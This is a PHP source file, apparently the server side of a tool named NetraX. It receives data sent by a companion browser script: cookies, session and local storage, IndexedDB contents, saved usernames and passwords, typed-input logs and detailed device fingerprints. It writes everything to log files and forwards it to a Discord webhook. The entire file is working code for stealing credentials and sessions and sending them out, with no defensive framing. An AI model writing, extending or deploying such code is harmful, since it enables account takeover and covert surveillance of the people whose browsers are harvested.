<?php
/* ════════════════════════════════════════════════════════════════════
   cookie_handler.php  -- Cookie, Session ID & Stored Credential Capture
   ──────────────────────────────────────────────────────────────────
   Receives JSON payload from netrax_collector.js.
   ONLY prints to terminal / saves / sends to Discord when
   meaningful data is captured (real cookies, credentials, or storage).
   ════════════════════════════════════════════════════════════════════ */

/* ── Discord Webhook Integration ────────────────────────────── */
if (!defined('DISCORD_WEBHOOK_URL')) {
    require_once __DIR__ . '/../core/discord_webhook.php';
}

/* ── Headers ────────────────────────────────────────────────── */
header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

/* ── Handle CORS preflight ──────────────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

/* ── Only accept POST ───────────────────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method Not Allowed']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   SANITISATION HELPER
   ════════════════════════════════════════════════════════════ */
function cleanCookie(string $val): string {
    return html_entity_decode(strip_tags(trim($val)), ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

/* ════════════════════════════════════════════════════════════
   HELPER: Filter out NetraX's own _nx_ cookies
   ════════════════════════════════════════════════════════════ */
function filterNxCookies(string $cookieStr): string {
    if (empty($cookieStr) || $cookieStr === 'None') return '';

    $pairs = array_map('trim', explode(';', $cookieStr));
    $real = [];
    foreach ($pairs as $pair) {
        if (empty($pair)) continue;
        // Skip our own planted tracking cookies
        if (strpos($pair, '_nx_') === 0) continue;
        $real[] = $pair;
    }
    return implode('; ', $real);
}

/* ════════════════════════════════════════════════════════════
   INPUT COLLECTION
   ════════════════════════════════════════════════════════════ */
$raw_body = file_get_contents('php://input');
$json_data = json_decode($raw_body, true);

if ($json_data === null) {
    $json_data = $_POST;
}

$raw_cookies          = cleanCookie($json_data['cookies']             ?? 'None');
$tracking_cookies     = cleanCookie($json_data['tracking_cookies']    ?? '');
$session_storage      = cleanCookie($json_data['session_storage']     ?? 'None');
$local_storage        = cleanCookie($json_data['local_storage']       ?? 'None');
$stored_username      = cleanCookie($json_data['stored_username']     ?? '');
$stored_password      = cleanCookie($json_data['stored_password']     ?? '');
$input_log            = cleanCookie($json_data['input_log']           ?? '');
$indexeddb            = cleanCookie($json_data['indexeddb']            ?? '');
$page_url             = cleanCookie($json_data['page_url']            ?? 'Unknown');
$page_title           = cleanCookie($json_data['page_title']          ?? 'Unknown');

/* ── Hardware & Telemetry fields ──────────────────────────── */
$screen_resolution    = cleanCookie($json_data['screen_resolution']   ?? '');
$screen_viewport      = cleanCookie($json_data['screen_viewport']     ?? '');
$screen_color_depth   = cleanCookie($json_data['screen_color_depth']  ?? '');
$screen_pixel_ratio   = cleanCookie($json_data['screen_pixel_ratio']  ?? '');
$battery_level        = cleanCookie($json_data['battery_level']       ?? '');
$battery_charging     = cleanCookie($json_data['battery_charging']    ?? '');
$connection_type      = cleanCookie($json_data['connection_type']     ?? '');
$connection_effective = cleanCookie($json_data['connection_effective']?? '');
$connection_downlink  = cleanCookie($json_data['connection_downlink'] ?? '');
$connection_rtt       = cleanCookie($json_data['connection_rtt']      ?? '');
$canvas_fingerprint   = cleanCookie($json_data['canvas_fingerprint']  ?? '');
$webgl_vendor         = cleanCookie($json_data['webgl_vendor']        ?? '');
$webgl_renderer       = cleanCookie($json_data['webgl_renderer']      ?? '');
$hardware_concurrency = cleanCookie($json_data['hardware_concurrency']?? '');
$device_memory        = cleanCookie($json_data['device_memory']       ?? '');
$is_tor_browser       = cleanCookie($json_data['is_tor_browser']      ?? '');
$bluetooth_status     = cleanCookie($json_data['bluetooth_status']    ?? '');
$bluetooth_device     = cleanCookie($json_data['bluetooth_device']    ?? '');
$device_type          = cleanCookie($json_data['device_type']         ?? '');
$device_model         = cleanCookie($json_data['device_model']        ?? '');
$device_ram           = cleanCookie($json_data['device_ram']          ?? '');
$device_storage       = cleanCookie($json_data['device_storage']      ?? '');
$device_cpu           = cleanCookie($json_data['device_cpu']          ?? '');
$device_architecture  = cleanCookie($json_data['device_architecture'] ?? '');

/* ── Filter out our own _nx_ cookies from the display ─────── */
$real_cookies = filterNxCookies($raw_cookies);

/* ════════════════════════════════════════════════════════════
   CHECK: Is there meaningful data?
   Only proceed if we captured something real.
   ════════════════════════════════════════════════════════════ */
$has_real_cookies    = !empty($real_cookies);
$has_session_storage = !empty($session_storage) && $session_storage !== 'None';
$has_local_storage   = !empty($local_storage) && $local_storage !== 'None';
$has_credentials     = !empty($stored_username) || !empty($stored_password);
$has_input_log       = !empty($input_log);
$has_indexeddb       = !empty($indexeddb);
$has_telemetry       = !empty($screen_resolution) || !empty($canvas_fingerprint) || !empty($battery_level) || !empty($connection_type);

$has_meaningful_data = $has_real_cookies || $has_session_storage || $has_local_storage
                     || $has_credentials || $has_input_log || $has_indexeddb || $has_telemetry;

if (!$has_meaningful_data) {
    // Nothing real captured -- silently succeed without printing/saving/notifying
    echo json_encode(['status' => 'success', 'message' => 'No meaningful data']);
    exit;
}

/* ════════════════════════════════════════════════════════════
   COMMON METADATA & REVERSE DNS RESOLUTION
   ════════════════════════════════════════════════════════════ */
$data_dir   = dirname(__DIR__) . '/data';
$timestamp  = date('Y-m-d H:i:s T');
$client_ip  = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

/* Resolve ISP Hostname via Reverse DNS (Best effort for network/broadband identification) */
$reverse_host = 'Unknown';
if (!empty($client_ip) && filter_var($client_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    $reverse_host = @gethostbyaddr($client_ip);
    if ($reverse_host === false || $reverse_host === $client_ip) {
        $reverse_host = 'Not resolved';
    }
}

if (!is_dir($data_dir)) {
    mkdir($data_dir, 0750, true);
}

/* ════════════════════════════════════════════════════════════
   DEDUPLICATION (don't log identical payloads within 30s)
   ════════════════════════════════════════════════════════════ */
$dedup_file = $data_dir . '/.cookie_dedup';
$dedup_key  = md5($client_ip . '|' . $real_cookies . '|' . $stored_username
              . '|' . $stored_password . '|' . $input_log
              . '|' . $session_storage . '|' . $local_storage . '|' . $canvas_fingerprint);
$dedup_data = @file_get_contents($dedup_file);
if ($dedup_data) {
    $dedup = json_decode($dedup_data, true);
    if ($dedup && isset($dedup['key']) && $dedup['key'] === $dedup_key
        && isset($dedup['time']) && (time() - $dedup['time']) < 30) {
        echo json_encode(['status' => 'success', 'message' => 'Already captured']);
        exit;
    }
}
file_put_contents($dedup_file, json_encode(['key' => $dedup_key, 'time' => time()]));

/* ════════════════════════════════════════════════════════════
   BUILD DATA RECORD
   ════════════════════════════════════════════════════════════ */
$record = [
    'timestamp'            => $timestamp,
    'ip'                   => $client_ip,
    'reverse_host'         => $reverse_host,
    'user_agent'           => $user_agent,
    'page_url'             => $page_url,
    'page_title'           => $page_title,
    'screen_resolution'    => $screen_resolution,
    'screen_viewport'      => $screen_viewport,
    'screen_pixel_ratio'   => $screen_pixel_ratio,
    'screen_color_depth'   => $screen_color_depth,
    'battery_level'        => $battery_level,
    'battery_charging'     => $battery_charging,
    'connection_type'      => $connection_type,
    'connection_effective' => $connection_effective,
    'connection_downlink'  => $connection_downlink,
    'connection_rtt'       => $connection_rtt,
    'canvas_fingerprint'   => $canvas_fingerprint,
    'webgl_vendor'         => $webgl_vendor,
    'webgl_renderer'       => $webgl_renderer,
    'hardware_concurrency' => $hardware_concurrency,
    'device_memory'        => $device_memory,
    'bluetooth_status'     => $bluetooth_status,
    'bluetooth_device'     => $bluetooth_device,
    'device_type'          => $device_type,
    'device_model'         => $device_model,
    'device_ram'           => $device_ram,
    'device_storage'       => $device_storage,
    'device_cpu'           => $device_cpu,
    'device_architecture'  => $device_architecture,
    'cookies'              => $real_cookies ?: 'None',
    'tracking_cookies'     => $tracking_cookies,
    'session_storage'      => $session_storage,
    'local_storage'        => $local_storage,
    'stored_username'      => $stored_username,
    'stored_password'      => $stored_password,
    'input_log'            => $input_log,
    'indexeddb'            => $indexeddb,
];

/* ════════════════════════════════════════════════════════════
   1. SAVE TO TEXT LOG  (data/cookies_sessions.txt)
   ════════════════════════════════════════════════════════════ */
$divider  = str_repeat('═', 60);
$subdiv   = str_repeat('─', 40);

/* Helper: return the value or a professional fallback message */
function nxLabel(string $val, string $fallback = 'Not fetched'): string {
    return (!empty($val) && $val !== 'None') ? $val : $fallback;
}

$txt_entry  = "\n{$divider}\n";
$txt_entry .= "🔍 TELEMETRY, DEVICE & SESSION CAPTURE  [{$timestamp}]\n";
$txt_entry .= "{$divider}\n";
$txt_entry .= "IP Address      : {$client_ip}\n";
$txt_entry .= "Network Host    : " . nxLabel($reverse_host, 'Could not resolve (private/local IP)') . "\n";
$txt_entry .= "User-Agent      : {$user_agent}\n";
$txt_entry .= "Page            : {$page_title}\n";
$txt_entry .= "URL             : {$page_url}\n";

$txt_entry .= "{$subdiv}\n";
$txt_entry .= "Screen Size     : " . nxLabel($screen_resolution) . "\n";
if (!empty($screen_viewport) && $screen_viewport !== 'Could not detect') {
    $txt_entry .= "Viewport        : {$screen_viewport}, Pixel Ratio: " . nxLabel($screen_pixel_ratio) . "\n";
}
$txt_entry .= "Battery         : " . nxLabel($battery_level) . " — " . nxLabel($battery_charging, 'N/A') . "\n";
$txt_entry .= "Network Conn    : " . nxLabel($connection_type);
if (!empty($connection_effective) && $connection_effective !== $connection_type) {
    $txt_entry .= " ({$connection_effective})";
}
if (!empty($connection_downlink)) {
    $txt_entry .= " | Speed: {$connection_downlink}";
}
if (!empty($connection_rtt)) {
    $txt_entry .= " | Latency: {$connection_rtt}";
}
$txt_entry .= "\n";
$txt_entry .= "Canvas Hash     : " . nxLabel($canvas_fingerprint) . "\n";
$txt_entry .= "GPU Model       : " . nxLabel($webgl_renderer) . "\n";
$txt_entry .= "CPU Cores       : " . nxLabel($hardware_concurrency) . "\n";
$txt_entry .= "Device Memory   : " . nxLabel($device_memory) . "\n";
if (!empty($device_model)) {
    $txt_entry .= "Device Model    : " . nxLabel($device_model) . "\n";
}
if (!empty($device_type)) {
    $txt_entry .= "Device Type     : " . nxLabel($device_type) . "\n";
}
if (!empty($device_ram)) {
    $txt_entry .= "RAM (Memory)    : " . nxLabel($device_ram) . "\n";
}
if (!empty($device_storage)) {
    $txt_entry .= "Storage (ROM)   : " . nxLabel($device_storage) . "\n";
}
if (!empty($device_cpu)) {
    $txt_entry .= "CPU & Arch      : " . nxLabel($device_cpu) . "\n";
}
$bt_text = nxLabel($bluetooth_status);
if (!empty($bluetooth_device)) {
    $bt_text .= " (Paired: {$bluetooth_device})";
}
$txt_entry .= "Bluetooth       : {$bt_text}\n";

if ($has_real_cookies) {
    $txt_entry .= "{$subdiv}\n";
    $txt_entry .= "Cookies         : {$real_cookies}\n";
}

if ($has_session_storage) {
    $txt_entry .= "Session Storage : {$session_storage}\n";
}

if ($has_local_storage) {
    $txt_entry .= "Local Storage   : {$local_storage}\n";
}

if ($has_indexeddb) {
    $txt_entry .= "IndexedDB       : {$indexeddb}\n";
}

if ($has_credentials) {
    $txt_entry .= "{$subdiv}\n";
    if (!empty($stored_username)) $txt_entry .= "Stored Username : {$stored_username}\n";
    if (!empty($stored_password)) $txt_entry .= "Stored Password : {$stored_password}\n";
}

if ($has_input_log) {
    $txt_entry .= "{$subdiv}\n";
    $txt_entry .= "Input Capture   : {$input_log}\n";
}

$txt_entry .= "{$divider}\n";

$txt_file = $data_dir . '/cookies_sessions.txt';
$fp = fopen($txt_file, 'a');
if ($fp) {
    flock($fp, LOCK_EX);
    fwrite($fp, $txt_entry);
    flock($fp, LOCK_UN);
    fclose($fp);
}

/* ════════════════════════════════════════════════════════════
   2. SAVE TO JSONL LOG  (data/cookies_sessions.jsonl)
   ════════════════════════════════════════════════════════════ */
$jsonl_file = $data_dir . '/cookies_sessions.jsonl';
$fp = fopen($jsonl_file, 'a');
if ($fp) {
    flock($fp, LOCK_EX);
    fwrite($fp, json_encode($record, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n");
    flock($fp, LOCK_UN);
    fclose($fp);
}

/* ════════════════════════════════════════════════════════════
   3. TERMINAL FLAG  (.flag_cookies)
   ════════════════════════════════════════════════════════════ */
$terminal_output  = "[+] IP: {$client_ip}  |  Page: {$page_title}\n";
$terminal_output .= "[+] Screen: " . nxLabel($screen_resolution) . "  |  Scale: " . nxLabel($screen_pixel_ratio) . "\n";
$terminal_output .= "[+] Battery: " . nxLabel($battery_level) . "  |  " . nxLabel($battery_charging, 'N/A') . "\n";

$net_label = nxLabel($connection_type);
if (!empty($connection_effective) && strpos($net_label, $connection_effective) === false && $connection_effective !== $connection_type) {
    $net_label .= " ({$connection_effective})";
}
if (!empty($connection_downlink)) {
    $net_label .= " — Speed: {$connection_downlink}";
}
if (!empty($connection_rtt)) {
    $net_label .= " (Ping: {$connection_rtt})";
}
$terminal_output .= "[+] Network: {$net_label}\n";
$terminal_output .= "[+] ISP Host: " . nxLabel($reverse_host, 'Could not resolve') . "\n";
$terminal_output .= "[+] Canvas Hash: " . nxLabel($canvas_fingerprint) . "\n";
$terminal_output .= "[+] GPU: " . nxLabel($webgl_renderer) . "\n";
if (!empty($device_model)) {
    $terminal_output .= "[+] Device Model: " . nxLabel($device_model) . "\n";
}
if (!empty($device_type)) {
    $terminal_output .= "[+] Device Type: " . nxLabel($device_type) . "\n";
}
if (!empty($device_ram)) {
    $terminal_output .= "[+] RAM Memory: " . nxLabel($device_ram) . "\n";
}
if (!empty($device_storage)) {
    $terminal_output .= "[+] Storage (ROM): " . nxLabel($device_storage) . "\n";
}
if (!empty($device_cpu)) {
    $terminal_output .= "[+] CPU Hardware: " . nxLabel($device_cpu) . "\n";
}
$bt_term = nxLabel($bluetooth_status);
if (!empty($bluetooth_device)) {
    $bt_term .= " (Device: {$bluetooth_device})";
}
$terminal_output .= "[+] Bluetooth: {$bt_term}\n";
if (!empty($is_tor_browser) && $is_tor_browser !== 'No') {
    $terminal_output .= "[+] Tor Privacy: {$is_tor_browser}\n";
}

if ($has_real_cookies) {
    $c_disp = (strlen($real_cookies) > 300) ? substr($real_cookies, 0, 300) . '...' : $real_cookies;
    $terminal_output .= "[+] Cookies: {$c_disp}\n";
}

if ($has_session_storage) {
    $ss_disp = (strlen($session_storage) > 200) ? substr($session_storage, 0, 200) . '...' : $session_storage;
    $terminal_output .= "[+] Session Storage: {$ss_disp}\n";
}

if ($has_local_storage) {
    $ls_disp = (strlen($local_storage) > 200) ? substr($local_storage, 0, 200) . '...' : $local_storage;
}

if ($has_indexeddb) {
    $terminal_output .= "[+] IndexedDB: {$indexeddb}\n";
}

if (!empty($stored_username)) {
    $terminal_output .= "[+] Stored Username: {$stored_username}\n";
}
if (!empty($stored_password)) {
    $terminal_output .= "[+] Stored Password: {$stored_password}\n";
}

if ($has_input_log) {
    $il_disp = (strlen($input_log) > 300) ? substr($input_log, 0, 300) . '...' : $input_log;
    $terminal_output .= "[+] Input Capture: {$il_disp}\n";
}

file_put_contents($data_dir . '/.flag_cookies', $terminal_output);

/* ════════════════════════════════════════════════════════════
   4. DISCORD WEBHOOK ALERT
   ════════════════════════════════════════════════════════════ */
$discord_net = nxLabel($connection_type);
if (!empty($connection_effective) && strpos($discord_net, $connection_effective) === false && $connection_effective !== $connection_type) {
    $discord_net .= " ({$connection_effective})";
}
if (!empty($connection_downlink)) {
    $discord_net .= " • {$connection_downlink}";
}
if (!empty($connection_rtt)) {
    $discord_net .= " (Ping: {$connection_rtt})";
}

$discord_fields = [
    '🌐 IP Address'   => $client_ip,
    '📄 Page'         => $page_title,
    '🖥️ Screen'       => nxLabel($screen_resolution) . ' (' . nxLabel($screen_pixel_ratio) . ')',
    '🔋 Battery'      => nxLabel($battery_level) . ' — ' . nxLabel($battery_charging, 'N/A'),
    '📶 Network'      => $discord_net,
    '🏢 ISP / Host'   => nxLabel($reverse_host, 'Could not resolve'),
    '📱 Device Model' => nxLabel($device_model, 'Could not extract'),
    '💻 Form Factor'  => nxLabel($device_type, 'Unknown'),
    '💾 RAM / Disk'   => nxLabel($device_ram, 'N/A') . ' • ' . nxLabel($device_storage, 'N/A'),
    '⚙️ CPU Hardware' => nxLabel($device_cpu, 'N/A'),
    '📻 Bluetooth'    => nxLabel($bluetooth_status) . (!empty($bluetooth_device) ? " [{$bluetooth_device}]" : ''),
    '🎮 GPU / Canvas' => nxLabel($webgl_renderer) . ' [Hash: ' . nxLabel($canvas_fingerprint) . ']',
];

if (!empty($is_tor_browser) && $is_tor_browser !== 'No') {
    $discord_fields['🧅 Tor Privacy'] = $is_tor_browser;
}

if ($has_real_cookies) {
    $discord_fields['🍪 Cookies'] = (strlen($real_cookies) > 200) ? substr($real_cookies, 0, 200) . '…' : $real_cookies;
}

if ($has_session_storage) {
    $discord_fields['📦 Session Store'] = (strlen($session_storage) > 200) ? substr($session_storage, 0, 200) . '…' : $session_storage;
}

if ($has_local_storage) {
    $discord_fields['💾 Local Store'] = (strlen($local_storage) > 200) ? substr($local_storage, 0, 200) . '…' : $local_storage;
}

if ($has_indexeddb) {
    $discord_fields['🗄️ IndexedDB'] = $indexeddb;
}

if (!empty($stored_username)) {
    $discord_fields['👤 Stored User'] = $stored_username;
}
if (!empty($stored_password)) {
    $discord_fields['🔑 Stored Pass'] = $stored_password;
}

if ($has_input_log) {
    $discord_fields['⌨️ Input Log'] = (strlen($input_log) > 200) ? substr($input_log, 0, 200) . '…' : $input_log;
}

sendDiscordAlert('⚡ Device Telemetry & Session Capture', $discord_fields, 16744448 /* 0xFF8000 orange */);

/* ── Success response ── */
echo json_encode(['status' => 'success', 'message' => 'Data captured']);
exit;
